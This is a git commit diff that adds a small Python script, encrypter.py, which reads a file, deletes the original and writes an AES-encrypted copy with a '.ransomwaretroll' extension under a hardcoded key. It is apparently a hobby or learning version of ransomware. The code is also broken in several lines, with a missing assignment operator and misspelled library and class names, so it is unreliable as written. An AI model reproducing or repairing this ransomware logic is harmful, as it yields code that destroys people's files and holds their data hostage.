3b54cf709b1166420f5ecdb3624c916af258c662
Rafael Penela <153391219+RafaelPenela@users.noreply.github.com>
2025-01-19 15:50:40 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -1,2 +1,18 @@
 import os
+import pyaes
 
+file_name = "info.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+os.remove(file_name)
+
+key b"testeransomware"
+aes=pyas.AESmodeofOperationCTR(key)
+crypto_data = aes.encrypt(file_data)
+
+new_file = file_name + ".ransomwaretroll"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
